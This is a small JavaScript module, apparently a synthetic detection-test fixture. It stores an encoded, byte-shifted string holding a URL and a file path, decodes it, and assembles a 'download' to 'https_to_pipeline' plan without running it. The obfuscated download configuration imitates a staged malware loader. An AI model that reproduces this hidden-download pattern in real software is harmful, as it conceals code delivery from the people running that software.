const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_0b1ca727 = "lFtPmpGSg46RW3+Bj5OHkIN9kIOLjZKDSpWQh5KDfYSHioOaf4J/jpKDkFuGkpKOkX2SjX2Oh46DioeMg5qRkn+Fg32BjZOMkltPmoF/i45/h4WMfYeCW2xtYmNLYFZSVGNgU1Cak5CKW4aSko6RWE1NjI2Cg0uAVlJUg4BTUE5Qg4JMg5Z/i46Kg0yHjJR/ioeCTX+Oh5qTkYOQfX+Fg4ySW2yNgoNfk4KHkk2AVlJUmoSHioN9jn+ShltNkouOTYaTjJKQg5GRS4yNgoNNTJGSf4WDS4BWUlSDgFNQTlCDgkyLiJE=";
const Codec_0b1ca727 = "base64_literal|add_modulo_256|1e";

function load_0b1ca727() { return [...Buffer.from(Material_0b1ca727, "base64")]; }
function decode_0b1ca727(e) { return e.map((value) => (value - 30 + 256) & 255); }
async function recover_0b1ca727() {
  const [n] = ["compass"];
  const e = load_0b1ca727(); let d = [];
  d = decode_0b1ca727(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_0b1ca727() { return (await recover_0b1ca727()).split("|").join("|"); }
async function plan_0b1ca727() { const inspect = inspect_0b1ca727; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_0b1ca727;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_0b1ca727());
